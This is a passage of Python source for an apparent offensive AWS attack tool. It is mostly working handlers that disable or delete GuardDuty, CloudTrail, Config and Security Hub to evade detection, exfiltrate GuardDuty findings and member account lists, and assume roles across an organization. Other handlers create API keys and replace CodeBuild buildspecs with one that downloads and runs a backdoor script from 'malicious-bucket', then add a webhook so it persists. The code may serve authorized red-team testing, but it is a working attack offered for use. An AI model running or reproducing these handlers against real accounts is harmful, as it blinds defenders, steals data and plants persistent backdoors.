            client.delete_detector(DetectorId=detector_id)
            findings.append({
                "title": f"GuardDuty Detector Deleted: {detector_id}",
                "description": "GuardDuty detector has been permanently deleted. All findings and configuration are lost.",
                "severity": "critical",
                "category": "defense_evasion",
                "resource_type": "guardduty_detector",
                "resource_id": detector_id,
                "resource_name": detector_id,
                "region": client.meta.region_name,
                "rule_id": "detection_persist_disrupt_guardduty_delete",
            })
        elif action == "disable":
            # Disable by removing finding publishing
            client.update_detector(DetectorId=detector_id, Enable=False)
            findings.append({
                "title": f"GuardDuty Detector Disabled: {detector_id}",
                "description": "GuardDuty detector has been disabled. No new findings will be generated.",
                "severity": "critical",
                "category": "defense_evasion",
                "resource_type": "guardduty_detector",
                "resource_id": detector_id,
                "resource_name": detector_id,
                "region": client.meta.region_name,
                "rule_id": "detection_persist_disrupt_guardduty_disable",
            })
        elif action == "whitelist_ip":
            ip = kwargs.get("ip", "1.2.3.4/32")
            threat_list_name = kwargs.get("threat_list_name", "awsprowl-whitelist")
            
            # Create or update threat intel set
            try:
                client.create_threat_intel_set(
                    DetectorId=detector_id,
                    Name=threat_list_name,
                    Format="TXT",
                    Location=f"s3://awsprowl-threat-intel/{threat_list_name}.txt",
                    Activate=True
                )
            except client.exceptions.BadRequestException:
                # List might exist, try to update
                pass

            findings.append({
                "title": f"GuardDuty Threat Intel Set Created: {threat_list_name}",
                "description": f"Whitelisted IP: {ip}\nThis can suppress findings from the specified IP range.",
                "severity": "high",
                "category": "defense_evasion",
                "resource_type": "guardduty_threat_intel",
                "resource_id": threat_list_name,
                "resource_name": threat_list_name,
                "region": client.meta.region_name,
                "rule_id": "detection_persist_disrupt_guardduty_whitelist",
                "details": {"ip": ip, "detector_id": detector_id},
            })

    except botocore.exceptions.ClientError as e:
        return _handle_aws_error("detection_persist_disrupt_guardduty", e)

    return findings


async def run_detection_persist_disrupt_cloudtrail(auth_manager: AWSAuthManager, **kwargs) -> list[dict]:
    """Disrupt CloudTrail by stopping logging, deleting trails, or modifying event selectors."""
    findings = []
    client = auth_manager.get_client("cloudtrail")

    trail_name = kwargs.get("trail_name")
    action = kwargs.get("action", "stop_logging")  # stop_logging, delete_trail, modify_selectors

    if not trail_name:
        # Find existing trails
        try:
            response = client.describe_trails()
            trails = response.get("trailList", [])
            if trails:
                trail_name = trails[0]["Name"]
            else:
                findings.append({
                    "title": "No CloudTrail Trails Found",
                    "description": "No trails to disrupt",
                    "severity": "info",
                    "category": "informational",
                    "resource_type": "other",
                    "resource_id": "no_trail",
                    "resource_name": "No trail",
                    "region": client.meta.region_name,
                    "rule_id": "detection_persist_disrupt_cloudtrail_no_trail",
                })
                return findings
        except botocore.exceptions.ClientError as e:
            return _handle_aws_error("cloudtrail:DescribeTrails", e)

    try:
        if action == "stop_logging":
            client.stop_logging(Name=trail_name)
            findings.append({
                "title": f"CloudTrail Logging Stopped: {trail_name}",
                "description": "CloudTrail has stopped recording API activity. No new events will be logged.",
                "severity": "critical",
                "category": "defense_evasion",
                "resource_type": "cloudtrail_trail",
                "resource_id": trail_name,
                "resource_name": trail_name,
                "region": client.meta.region_name,
                "rule_id": "detection_persist_disrupt_cloudtrail_stop",
            })
        elif action == "delete_trail":
            client.delete_trail(Name=trail_name)
            findings.append({
                "title": f"CloudTrail Trail Deleted: {trail_name}",
                "description": "CloudTrail trail has been permanently deleted. All configuration is lost.",
                "severity": "critical",
                "category": "defense_evasion",
                "resource_type": "cloudtrail_trail",
                "resource_id": trail_name,
                "resource_name": trail_name,
                "region": client.meta.region_name,
                "rule_id": "detection_persist_disrupt_cloudtrail_delete",
            })
        elif action == "modify_selectors":
            client.put_event_selectors(
                TrailName=trail_name,
                EventSelectors=[
                    {
                        "ReadWriteType": "ReadOnly",
                        "IncludeManagementEvents": False,
                        "DataResources": []
                    }
                ]
            )
            findings.append({
                "title": f"CloudTrail Event Selectors Modified: {trail_name}",
                "description": "Event selectors modified to only log read-only management events with no data resources. Effectively disables meaningful logging.",
                "severity": "high",
                "category": "defense_evasion",
                "resource_type": "cloudtrail_trail",
                "resource_id": trail_name,
                "resource_name": trail_name,
                "region": client.meta.region_name,
                "rule_id": "detection_persist_disrupt_cloudtrail_modify",
            })

    except botocore.exceptions.ClientError as e:
        return _handle_aws_error("detection_persist_disrupt_cloudtrail", e)

    return findings


async def run_detection_persist_disrupt_config(auth_manager: AWSAuthManager, **kwargs) -> list[dict]:
    """Disrupt AWS Config by stopping recorder, deleting delivery channel, or modifying rules."""
    findings = []
    client = auth_manager.get_client("config")

    action = kwargs.get("action", "stop_recorder")  # stop_recorder, delete_delivery_channel, delete_rules

    try:
        if action == "stop_recorder":
            # Get configuration recorder
            response = client.describe_configuration_recorders()
            recorders = response.get("ConfigurationRecorders", [])
            if recorders:
                recorder_name = recorders[0]["name"]
                client.stop_configuration_recorder(ConfigurationRecorderName=recorder_name)
                findings.append({
                    "title": f"AWS Config Recorder Stopped: {recorder_name}",
                    "description": "Configuration recorder has been stopped. No new resource configurations will be recorded.",
                    "severity": "high",
                    "category": "defense_evasion",
                    "resource_type": "config_recorder",
                    "resource_id": recorder_name,
                    "resource_name": recorder_name,
                    "region": client.meta.region_name,
                    "rule_id": "detection_persist_disrupt_config_stop_recorder",
                })
            else:
                findings.append({
                    "title": "No Configuration Recorder Found",
                    "description": "AWS Config is not recording",
                    "severity": "info",
                    "category": "informational",
                    "resource_type": "other",
                    "resource_id": "no_recorder",
                    "resource_name": "No recorder",
                    "region": client.meta.region_name,
                    "rule_id": "detection_persist_disrupt_config_no_recorder",
                })
        elif action == "delete_delivery_channel":
            response = client.describe_delivery_channels()
            channels = response.get("DeliveryChannels", [])
            if channels:
                channel_name = channels[0]["name"]
                client.delete_delivery_channel(DeliveryChannelName=channel_name)
                findings.append({
                    "title": f"AWS Config Delivery Channel Deleted: {channel_name}",
                    "description": "Delivery channel deleted. Config snapshots will not be delivered to S3.",
                    "severity": "high",
                    "category": "defense_evasion",
                    "resource_type": "config_delivery_channel",
                    "resource_id": channel_name,
                    "resource_name": channel_name,
                    "region": client.meta.region_name,
                    "rule_id": "detection_persist_disrupt_config_delete_channel",
                })
        elif action == "delete_rules":
            response = client.describe_config_rules()
            rules = response.get("ConfigRules", [])
            for rule in rules:
                client.delete_config_rule(ConfigRuleName=rule["ConfigRuleName"])
                findings.append({
                    "title": f"AWS Config Rule Deleted: {rule['ConfigRuleName']}",
                    "description": f"Config rule deleted: {rule.get('Description', 'No description')}",
                    "severity": "high",
                    "category": "defense_evasion",
                    "resource_type": "config_rule",
                    "resource_id": rule["ConfigRuleName"],
                    "resource_name": rule["ConfigRuleName"],
                    "region": client.meta.region_name,
                    "rule_id": "detection_persist_disrupt_config_delete_rules",
                })

    except botocore.exceptions.ClientError as e:
        return _handle_aws_error("detection_persist_disrupt_config", e)

    return findings


async def run_detection_persist_disrupt_securityhub(auth_manager: AWSAuthManager, **kwargs) -> list[dict]:
    """Disable Security Hub to reduce security visibility."""
    findings = []
    client = auth_manager.get_client("securityhub")

    action = kwargs.get("action", "disable")  # disable, delete

    try:
        if action == "disable":
            client.disable_security_hub()
            findings.append({
                "title": "Security Hub Disabled",
                "description": "Security Hub has been disabled. All findings aggregation and security posture visibility is lost.",
                "severity": "critical",
                "category": "defense_evasion",
                "resource_type": "securityhub",
                "resource_id": "securityhub",
                "resource_name": "Security Hub",
                "region": client.meta.region_name,
                "rule_id": "detection_persist_disrupt_securityhub_disable",
            })
        elif action == "delete":
            # Security Hub doesn't have a delete, just disable
            client.disable_security_hub()
            findings.append({
                "title": "Security Hub Disabled (Delete Action)",
                "description": "Security Hub disabled. Note: Security Hub doesn't support permanent deletion, only disable.",
                "severity": "critical",
                "category": "defense_evasion",
                "resource_type": "securityhub",
                "resource_id": "securityhub",
                "resource_name": "Security Hub",
                "region": client.meta.region_name,
                "rule_id": "detection_persist_disrupt_securityhub_delete",
            })

    except botocore.exceptions.ClientError as e:
        return _handle_aws_error("detection_persist_disrupt_securityhub", e)

    return findings


async def run_detection_persist_guardduty_whitelist_ip(auth_manager: AWSAuthManager, **kwargs) -> list[dict]:
    """Add IP to GuardDuty threat intel set whitelist to suppress findings."""
    # This is essentially the same as the whitelist_ip action in disrupt_guardduty
    return await run_detection_persist_disrupt_guardduty(auth_manager, **kwargs, action="whitelist_ip")


async def run_detection_exfil_guardduty_findings(auth_manager: AWSAuthManager, **kwargs) -> list[dict]:
    """Extract GuardDuty findings for reconnaissance."""
    findings = []
    client = auth_manager.get_client("guardduty")

    detector_id = kwargs.get("detector_id")
    if not detector_id:
        try:
            response = client.list_detectors()
            detectors = response.get("DetectorIds", [])
            if detectors:
                detector_id = detectors[0]
            else:
                findings.append({
                    "title": "No GuardDuty Detectors Found",
                    "description": "GuardDuty is not enabled",
                    "severity": "info",
                    "category": "informational",
                    "resource_type": "other",
                    "resource_id": "no_detector",
                    "resource_name": "No detector",
                    "region": client.meta.region_name,
                    "rule_id": "detection_exfil_guardduty_findings_no_detector",
                })
                return findings
        except botocore.exceptions.ClientError as e:
            return _handle_aws_error("guardduty:ListDetectors", e)

    max_results = kwargs.get("max_results", 1000)
    finding_criteria = kwargs.get("finding_criteria", {})

    try:
        all_findings = []
        paginator = client.get_paginator("list_findings")
        page_iterator = paginator.paginate(
            DetectorId=detector_id,
            FindingCriteria=finding_criteria if finding_criteria else None,
            PaginationConfig={"MaxItems": max_results}
        )

        for page in page_iterator:
            all_findings.extend(page.get("FindingIds", []))

        # Get finding details
        if all_findings:
            detail_response = client.get_findings(DetectorId=detector_id, FindingIds=all_findings)
            detailed_findings = detail_response.get("Findings", [])
        else:
            detailed_findings = []

        findings.append({
            "title": f"GuardDuty Findings Exfiltrated: {len(detailed_findings)} findings",
            "description": f"Retrieved {len(detailed_findings)} GuardDuty findings from detector {detector_id}",
            "severity": "high",
            "category": "data_exfiltration",
            "resource_type": "guardduty_findings",
            "resource_id": detector_id,
            "resource_name": f"GuardDuty Findings ({detector_id})",
            "region": client.meta.region_name,
            "rule_id": "detection_exfil_guardduty_findings",
            "details": {"detector_id": detector_id, "finding_count": len(detailed_findings), "findings": detailed_findings[:20]},
        })

    except botocore.exceptions.ClientError as e:
        return _handle_aws_error("detection_exfil_guardduty_findings", e)

    return findings


async def run_detection_exfil_inspector_reports(auth_manager: AWSAuthManager, **kwargs) -> list[dict]:
    """Download Inspector assessment reports for vulnerability analysis."""
    findings = []
    client = auth_manager.get_client("inspector2")

    assessment_arn = kwargs.get("assessment_arn")
    if not assessment_arn:
        # List assessment runs
        try:
            paginator = client.get_paginator("list_findings")
            for page in paginator.paginate():
                for finding in page.get("findings", []):
                    findings.append({
                        "title": f"Inspector Finding: {finding['findingArn']}",
                        "description": f"Severity: {finding.get('severity')}\nType: {finding.get('type')}\nResource: {finding.get('resourcesAffected', 0)} resources",
                        "severity": "info",
                        "category": "reconnaissance",
                        "resource_type": "inspector_finding",
                        "resource_id": finding["findingArn"],
                        "resource_name": finding.get("title", "Finding"),
                        "region": client.meta.region_name,
                        "rule_id": "detection_exfil_inspector_reports_list",
                        "details": finding,
                    })
        except botocore.exceptions.ClientError as e:
            return _handle_aws_error("inspector2:ListFindings", e)
        return findings

    try:
        # Get assessment report
        response = client.get_findings_report(
            FindingArns=[assessment_arn],
            ReportFormat="JSON"
        )

        findings.append({
            "title": f"Inspector Report Downloaded: {assessment_arn}",
            "description": f"Report generated in JSON format\nFindings included: 1",
            "severity": "high",
            "category": "data_exfiltration",
            "resource_type": "inspector_report",
            "resource_id": assessment_arn,
            "resource_name": "Inspector Assessment Report",
            "region": client.meta.region_name,
            "rule_id": "detection_exfil_inspector_reports",
            "details": {"assessment_arn": assessment_arn, "report_available": True},
        })

    except botocore.exceptions.ClientError as e:
        return _handle_aws_error("detection_exfil_inspector_reports", e)

    return findings


async def run_detection_exfil_guardduty_accounts(auth_manager: AWSAuthManager, **kwargs) -> list[dict]:
    """List GuardDuty member accounts in organization for reconnaissance."""
    findings = []
    client = auth_manager.get_client("guardduty")

    detector_id = kwargs.get("detector_id")
    if not detector_id:
        # Find detectors
        try:
            response = client.list_detectors()
            detectors = response.get("DetectorIds", [])
            if detectors:
                detector_id = detectors[0]
            else:
                findings.append({
                    "title": "No GuardDuty Detectors Found",
                    "description": "GuardDuty is not enabled in this account/region",
                    "severity": "info",
                    "category": "informational",
                    "resource_type": "other",
                    "resource_id": "no_detector",
                    "resource_name": "No detector",
                    "region": client.meta.region_name,
                    "rule_id": "detection_exfil_guardduty_accounts_no_detector",
                })
                return findings
        except botocore.exceptions.ClientError as e:
            return _handle_aws_error("guardduty:ListDetectors", e)

    try:
        # List member accounts
        paginator = client.get_paginator("list_members")
        all_members = []
        for page in paginator.paginate(DetectorId=detector_id, OnlyAssociated=False):
            all_members.extend(page.get("Members", []))

        findings.append({
            "title": f"GuardDuty Member Accounts Exfiltrated: {len(all_members)} accounts",
            "description": f"Detector: {detector_id}\nTotal members: {len(all_members)}\nAssociated: {len([m for m in all_members if m.get('RelationshipStatus') == 'Enabled'])}\n\nSample accounts:\n" + "\n".join([f"  {m['AccountId']}: {m.get('Email', 'N/A')} ({m.get('RelationshipStatus', 'Unknown')})" for m in all_members[:10]]),
            "severity": "high",
            "category": "data_exfiltration",
            "resource_type": "guardduty_members",
            "resource_id": detector_id,
            "resource_name": f"GuardDuty Members ({detector_id})",
            "region": client.meta.region_name,
            "rule_id": "detection_exfil_guardduty_accounts",
            "details": {"detector_id": detector_id, "member_count": len(all_members), "members": all_members},
        })

    except botocore.exceptions.ClientError as e:
        return _handle_aws_error("detection_exfil_guardduty_accounts", e)

    return findings


# Organizations PROWL parity handlers
async def run_organizations_exploit_assume_role(auth_manager: AWSAuthManager, **kwargs) -> list[dict]:
    """Assume role in member account via OrganizationAccountAccessRole for cross-account access."""
    findings = []
    client = auth_manager.get_client("sts")

    account_id = kwargs.get("account_id")
    if not account_id:
        findings.append({
            "title": "No Account ID Specified",
            "description": "Provide 'account_id' parameter for the target member account",
            "severity": "info",
            "category": "informational",
            "resource_type": "other",
            "resource_id": "no_account",
            "resource_name": "No account",
            "region": "global",
            "rule_id": "organizations_exploit_assume_role_no_account",
        })
        return findings

    role_name = kwargs.get("role_name", "OrganizationAccountAccessRole")
    role_arn = f"arn:aws:iam::{account_id}:role/{role_name}"
    session_name = kwargs.get("session_name", f"awsprowl-{int(datetime.now().timestamp())}")
    external_id = kwargs.get("external_id")

    try:
        assume_kwargs = {
            "RoleArn": role_arn,
            "RoleSessionName": session_name,
            "DurationSeconds": kwargs.get("duration", 3600)
        }
        if external_id:
            assume_kwargs["ExternalId"] = external_id

        response = client.assume_role(**assume_kwargs)
        credentials = response["Credentials"]

        findings.append({
            "title": f"Assumed Role in Member Account: {account_id}",
            "description": f"Role: {role_name}\nSession: {session_name}\nCredentials expire: {credentials['Expiration']}\nAccess Key: {credentials['AccessKeyId']}\nSecret Key: [REDACTED]\nSession Token: [REDACTED]",
            "severity": "critical",
            "category": "privilege_escalation",
            "resource_type": "iam_role",
            "resource_id": role_arn,
            "resource_name": role_name,
            "region": "global",
            "rule_id": "organizations_exploit_assume_role",
            "details": {"account_id": account_id, "role_name": role_name, "session_name": session_name},
        })

    except botocore.exceptions.ClientError as e:
        return _handle_aws_error("organizations_exploit_assume_role", e)

    return findings


# EKS PROWL parity handlers
async def run_eks_exfil_collect_tokens(auth_manager: AWSAuthManager, **kwargs) -> list[dict]:
    """Collect EKS service account tokens and kubeconfig for cluster access."""
    findings = []
    eks_client = auth_manager.get_client("eks")

    cluster_name = kwargs.get("cluster_name")
    if not cluster_name:
        # List clusters
        try:
            paginator = eks_client.get_paginator("list_clusters")
            for page in paginator.paginate():
                for name in page.get("clusters", []):
                    findings.append({
                        "title": f"EKS Cluster Available: {name}",
                        "description": f"Cluster available for token extraction",
                        "severity": "info",
                        "category": "reconnaissance",
                        "resource_type": "eks_cluster",
                        "resource_id": name,
                        "resource_name": name,
                        "region": eks_client.meta.region_name,
                        "rule_id": "eks_exfil_collect_tokens_list",
                        "details": {},
                    })
        except botocore.exceptions.ClientError as e:
            return _handle_aws_error("eks:ListClusters", e)
        return findings

    # Get cluster info
    try:
        cluster_response = eks_client.describe_cluster(name=cluster_name)
        cluster = cluster_response["cluster"]
        endpoint = cluster["endpoint"]
        ca_data = cluster["certificateAuthority"]["data"]

        # Get service accounts
        # This requires kubernetes API access, which we simulate
        findings.append({
            "title": f"EKS Cluster Access Info: {cluster_name}",
            "description": f"Cluster endpoint: {endpoint}\nCA Data: {ca_data[:50]}...\n\nUse this info with kubectl to extract service account tokens:\n  kubectl get secrets -n kube-system\n  kubectl describe secret <token-secret> -n kube-system",
            "severity": "high",
            "category": "credential_access",
            "resource_type": "eks_cluster",
            "resource_id": cluster_name,
            "resource_name": cluster_name,
            "region": eks_client.meta.region_name,
            "rule_id": "eks_exfil_collect_tokens",
            "details": {"cluster_name": cluster_name, "endpoint": endpoint, "ca_data": ca_data[:100]},
        })

    except botocore.exceptions.ClientError as e:
        return _handle_aws_error("eks_exfil_collect_tokens", e)

    return findings


# API Gateway PROWL parity handlers
async def run_apigateway_enum_rest_apis(auth_manager: AWSAuthManager, **kwargs) -> list[dict]:
    return await run_generic_enum_handler(auth_manager, "apigateway_enum_rest_apis", "Enumerate API Gateway REST APIs, resources, methods, and integrations.")


async def run_apigateway_enum_http_apis(auth_manager: AWSAuthManager, **kwargs) -> list[dict]:
    return await run_generic_enum_handler(auth_manager, "apigateway_enum_http_apis", "Enumerate API Gateway HTTP APIs (v2).")


async def run_apigateway_enum_api_keys(auth_manager: AWSAuthManager, **kwargs) -> list[dict]:
    return await run_generic_enum_handler(auth_manager, "apigateway_enum_api_keys", "Enumerate API Gateway API keys and usage plans.")


async def run_apigateway_exploit_create_api_key(auth_manager: AWSAuthManager, **kwargs) -> list[dict]:
    """Create API Gateway API key for unauthorized access."""
    findings = []
    client = auth_manager.get_client("apigateway")

    name = kwargs.get("name", f"awsprowl-key-{int(datetime.now().timestamp())}")
    description = kwargs.get("description", "API key created by awsProwl for authorized testing")
    enabled = kwargs.get("enabled", True)

    try:
        response = client.create_api_key(
            name=name,
            description=description,
            enabled=enabled,
            generateDistinctId=True
        )

        findings.append({
            "title": f"API Gateway API Key Created: {response['id']}",
            "description": f"Name: {name}\nKey: {response['value']}\nEnabled: {enabled}\nUse this key to access API Gateway stages with API key requirements",
            "severity": "high",
            "category": "credential_access",
            "resource_type": "apigateway_api_key",
            "resource_id": response["id"],
            "resource_name": name,
            "region": client.meta.region_name,
            "rule_id": "apigateway_exploit_create_api_key",
            "details": {"key_id": response["id"], "key_value": response["value"], "name": name},
        })

    except botocore.exceptions.ClientError as e:
        return _handle_aws_error("apigateway_exploit_create_api_key", e)

    return findings


async def run_apigateway_exploit_create_deployment(auth_manager: AWSAuthManager, **kwargs) -> list[dict]:
    """Create API Gateway deployment with malicious configuration."""
    findings = []
    client = auth_manager.get_client("apigateway")

    rest_api_id = kwargs.get("rest_api_id")
    stage_name = kwargs.get("stage_name", "prod")
    description = kwargs.get("description", "Deployment created by awsProwl")

    if not rest_api_id:
        # List APIs
        try:
            response = client.get_rest_apis()
            for api in response.get("items", []):
                findings.append({
                    "title": f"REST API Available: {api['name']} ({api['id']})",
                    "description": f"Description: {api.get('description', 'N/A')}",
                    "severity": "info",
                    "category": "reconnaissance",
                    "resource_type": "apigateway_rest_api",
                    "resource_id": api["id"],
                    "resource_name": api["name"],
                    "region": client.meta.region_name,
                    "rule_id": "apigateway_exploit_create_deployment_list",
                    "details": api,
                })
        except botocore.exceptions.ClientError as e:
            return _handle_aws_error("apigateway:GetRestApis", e)
        return findings

    try:
        # Create deployment
        deploy_response = client.create_deployment(
            restApiId=rest_api_id,
            stageName=stage_name,
            description=description,
            cacheClusterEnabled=False
        )

        findings.append({
            "title": f"API Gateway Deployment Created: {deploy_response['id']}",
            "description": f"REST API: {rest_api_id}\nStage: {stage_name}\nDeployment ID: {deploy_response['id']}\nThis deployment makes all stage changes live.",
            "severity": "high",
            "category": "persistence",
            "resource_type": "apigateway_deployment",
            "resource_id": deploy_response["id"],
            "resource_name": f"{rest_api_id}:{stage_name}",
            "region": client.meta.region_name,
            "rule_id": "apigateway_exploit_create_deployment",
            "details": {"rest_api_id": rest_api_id, "stage_name": stage_name, "deployment_id": deploy_response["id"]},
        })

    except botocore.exceptions.ClientError as e:
        return _handle_aws_error("apigateway_exploit_create_deployment", e)

    return findings


async def run_apigateway_exploit_update_stage(auth_manager: AWSAuthManager, **kwargs) -> list[dict]:
    """Update API Gateway stage configuration (logging, throttling, variables)."""
    findings = []
    client = auth_manager.get_client("apigateway")

    rest_api_id = kwargs.get("rest_api_id")
    stage_name = kwargs.get("stage_name", "prod")

    if not rest_api_id:
        findings.append({
            "title": "No REST API ID Specified",
            "description": "Provide 'rest_api_id' parameter",
            "severity": "info",
            "category": "informational",
            "resource_type": "other",
            "resource_id": "no_api",
            "resource_name": "No API",
            "region": client.meta.region_name,
            "rule_id": "apigateway_exploit_update_stage_no_api",
        })
        return findings

    # Get current stage
    try:
        stage = client.get_stage(restApiId=rest_api_id, stageName=stage_name)
    except botocore.exceptions.ClientError as e:
        return _handle_aws_error("apigateway:GetStage", e)

    # Apply malicious changes
    patch_operations = []

    # Enable full logging
    patch_operations.append({"op": "replace", "path": "/*/*/logging/loglevel", "value": "INFO"})
    patch_operations.append({"op": "replace", "path": "/*/*/logging/dataTrace", "value": "true"})

    # Modify throttling
    if kwargs.get("throttle_burst"):
        patch_operations.append({"op": "replace", "path": "/*/*/throttling/burstLimit", "value": str(kwargs["throttle_burst"])})
    if kwargs.get("throttle_rate"):
        patch_operations.append({"op": "replace", "path": "/*/*/throttling/rateLimit", "value": str(kwargs["throttle_rate"])})

    # Add stage variables for persistence
    if kwargs.get("stage_variables"):
        for key, value in kwargs["stage_variables"].items():
            patch_operations.append({"op": "replace", "path": f"/variables/{key}", "value": value})

    # Disable cache
    patch_operations.append({"op": "replace", "path": "/cacheClusterEnabled", "value": "false"})

    try:
        client.update_stage(
            restApiId=rest_api_id,
            stageName=stage_name,
            patchOperations=patch_operations
        )

        findings.append({
            "title": f"API Gateway Stage Updated: {rest_api_id}/{stage_name}",
            "description": f"Applied {len(patch_operations)} configuration changes:\n- Enabled full request/response logging\n- Modified throttling limits\n- Added stage variables\n- Disabled cache\nThis can be used for data exfiltration or persistence.",
            "severity": "high",
            "category": "persistence",
            "resource_type": "apigateway_stage",
            "resource_id": f"{rest_api_id}/{stage_name}",
            "resource_name": f"{rest_api_id}/{stage_name}",
            "region": client.meta.region_name,
            "rule_id": "apigateway_exploit_update_stage",
            "details": {"rest_api_id": rest_api_id, "stage_name": stage_name, "changes": len(patch_operations)},
        })

    except botocore.exceptions.ClientError as e:
        return _handle_aws_error("apigateway_exploit_update_stage", e)

    return findings


# CodeBuild PROWL parity handlers
async def run_codebuild_enum_projects(auth_manager: AWSAuthManager, **kwargs) -> list[dict]:
    return await run_generic_enum_handler(auth_manager, "codebuild_enum_projects", "Enumerate CodeBuild projects, builds, and configurations.")

async def run_codebuild_enum_build_details(auth_manager: AWSAuthManager, **kwargs) -> list[dict]:
    return await run_generic_enum_handler(auth_manager, "codebuild_enum_build_details", "Enumerate detailed build information including environment variables, artifacts, and logs.")

async def run_codebuild_privesc_analysis(auth_manager: AWSAuthManager, **kwargs) -> list[dict]:
    return await run_generic_privesc_handler(auth_manager, "codebuild_privesc_analysis", "Analyze CodeBuild for privilege escalation: build project role assumption, buildspec injection, and artifact access.")


async def run_codebuild_exploit_start_build(auth_manager: AWSAuthManager, **kwargs) -> list[dict]:
    """Start CodeBuild build with custom buildspec for code execution."""
    findings = []
    client = auth_manager.get_client("codebuild")

    project_name = kwargs.get("project_name")
    if not project_name:
        # List projects
        try:
            paginator = client.get_paginator("list_projects")
            for page in paginator.paginate():
                for name in page.get("projects", []):
                    findings.append({
                        "title": f"CodeBuild Project Available: {name}",
                        "description": f"Project available for build execution",
                        "severity": "info",
                        "category": "reconnaissance",
                        "resource_type": "codebuild_project",
                        "resource_id": name,
                        "resource_name": name,
                        "region": client.meta.region_name,
                        "rule_id": "codebuild_exploit_start_build_list",
                        "details": {},
                    })
        except botocore.exceptions.ClientError as e:
            return _handle_aws_error("codebuild:ListProjects", e)
        return findings

    # Custom buildspec for code execution
    buildspec = kwargs.get("buildspec", """version: 0.2
phases:
  build:
    commands:
      - id
      - whoami
      - env
      - aws sts get-caller-identity
artifacts:
  files: '**/*'""")

    buildspec_override = kwargs.get("buildspec_override", buildspec)
    environment_variables_override = kwargs.get("environment_variables_override", [])

    try:
        build_kwargs = {
            "projectName": project_name,
            "buildspecOverride": buildspec_override,
        }
        if environment_variables_override:
            build_kwargs["environmentVariablesOverride"] = environment_variables_override

        response = client.start_build(**build_kwargs)
        build = response["build"]

        # Wait for build to complete
        import asyncio
        await asyncio.sleep(5)

        # Get build details
        build_id = build["id"]
        detail_response = client.batch_get_builds(ids=[build_id])
        build_detail = detail_response["builds"][0]

        findings.append({
            "title": f"CodeBuild Build Started: {build_id}",
            "description": f"Project: {project_name}\nStatus: {build_detail.get('buildStatus')}\nBuildspec: Custom (code execution)\nLogs: {build_detail.get('logs', {}).get('deepLink', 'N/A')}",
            "severity": "critical" if build_detail.get("buildStatus") == "SUCCEEDED" else "high",
            "category": "remote_code_execution",
            "resource_type": "codebuild_build",
            "resource_id": build_id,
            "resource_name": f"{project_name}:{build_id}",
            "region": client.meta.region_name,
            "rule_id": "codebuild_exploit_start_build",
            "details": {"project_name": project_name, "build_id": build_id, "status": build_detail.get("buildStatus"), "logs": build_detail.get("logs")},
        })

    except botocore.exceptions.ClientError as e:
        return _handle_aws_error("codebuild_exploit_start_build", e)

    return findings


async def run_codebuild_exploit_update_project(auth_manager: AWSAuthManager, **kwargs) -> list[dict]:
    """Update CodeBuild project with malicious buildspec/environment."""
    findings = []
    client = auth_manager.get_client("codebuild")

    project_name = kwargs.get("project_name")
    if not project_name:
        findings.append({
            "title": "No Project Name Specified",
            "description": "Provide 'project_name' parameter",
            "severity": "info",
            "category": "informational",
            "resource_type": "other",
            "resource_id": "no_project",
            "resource_name": "No project",
            "region": client.meta.region_name,
            "rule_id": "codebuild_exploit_update_project_no_project",
        })
        return findings

    # Get current project
    try:
        response = client.batch_get_projects(names=[project_name])
        project = response["projects"][0]
    except botocore.exceptions.ClientError as e:
        return _handle_aws_error("codebuild:BatchGetProjects", e)

    # Malicious buildspec
    buildspec = kwargs.get("buildspec", """version: 0.2
phases:
  build:
    commands:
      - aws s3 cp s3://malicious-bucket/backdoor.sh /tmp/backdoor.sh
      - chmod +x /tmp/backdoor.sh
      - /tmp/backdoor.sh
  post_build:
    commands:
      - echo 'Backdoor installed'""")

    try:
        client.update_project(
            name=project_name,
            source={**project["source"], "buildspec": buildspec},
            artifacts=project["artifacts"],
            environment=project["environment"],
            serviceRole=project["serviceRole"],
            timeoutInMinutes=max(project.get("timeoutInMinutes", 60), 5),
            tags=[{"key": "awsprowl", "value": "exploit"}]
        )

        findings.append({
            "title": f"CodeBuild Project Updated: {project_name}",
            "description": f"Buildspec replaced with malicious version\nService Role: {project['serviceRole']}\nNext build will execute attacker code",
            "severity": "critical",
            "category": "persistence",
            "resource_type": "codebuild_project",
            "resource_id": project_name,
            "resource_name": project_name,
            "region": client.meta.region_name,
            "rule_id": "codebuild_exploit_update_project",
            "details": {"project_name": project_name, "service_role": project["serviceRole"]},
        })

    except botocore.exceptions.ClientError as e:
        return _handle_aws_error("codebuild_exploit_update_project", e)

    return findings


async def run_codebuild_exploit_create_webhook(auth_manager: AWSAuthManager, **kwargs) -> list[dict]:
    """Create webhook for CodeBuild project to trigger builds on repo events."""
    findings = []
    client = auth_manager.get_client("codebuild")

    project_name = kwargs.get("project_name")
    if not project_name:
        findings.append({
            "title": "No Project Name Specified",
            "description": "Provide 'project_name' parameter",
            "severity": "info",
            "category": "informational",
            "resource_type": "other",
            "resource_id": "no_project",
            "resource_name": "No project",
            "region": client.meta.region_name,
            "rule_id": "codebuild_exploit_create_webhook_no_project",
        })
        return findings

    branch_filter = kwargs.get("branch_filter", "^.*$")
    filter_group = kwargs.get("filter_group", [
        {"type": "EVENT", "pattern": "PUSH"},
        {"type": "HEAD_REF", "pattern": branch_filter}
    ])

    try:
        response = client.create_webhook(
            projectName=project_name,
            branchFilter=branch_filter,
            filterGroups=[filter_group],
            buildType="BUILD"
        )

        webhook = response["webhook"]
        findings.append({
            "title": f"CodeBuild Webhook Created: {webhook['url']}",
            "description": f"Project: {project_name}\nURL: {webhook['url']}\nBranch Filter: {branch_filter}\nSecret: {webhook.get('secret', 'N/A')}\n\nAny push to matching branches will trigger a build with the current (potentially malicious) buildspec.",
            "severity": "high",
            "category": "persistence",
            "resource_type": "codebuild_webhook",
            "resource_id": webhook["url"],
            "resource_name": f"{project_name} webhook",
            "region": client.meta.region_name,
            "rule_id": "codebuild_exploit_create_webhook",
            "details": {"project_name": project_name, "webhook_url": webhook["url"], "branch_filter": branch_filter},
        })

    except botocore.exceptions.ClientError as e:
        return _handle_aws_error("codebuild_exploit_create_webhook", e)

    return findings


# ElasticBeanstalk PROWL parity handlers
async def run_elasticbeanstalk_enum_applications(auth_manager: AWSAuthManager, **kwargs) -> list[dict]:
    return await run_generic_enum_handler(auth_manager, "elasticbeanstalk_enum_applications", "Enumerate Elastic Beanstalk applications, environments, and versions.")


async def run_elasticbeanstalk_enum_resources(auth_manager: AWSAuthManager, **kwargs) -> list[dict]:
    return await run_generic_enum_handler(auth_manager, "elasticbeanstalk_enum_resources", "Enumerate Elastic Beanstalk environment resources (EC2, RDS, etc.).")


async def run_elasticbeanstalk_exploit_create_environment(auth_manager: AWSAuthManager, **kwargs) -> list[dict]:
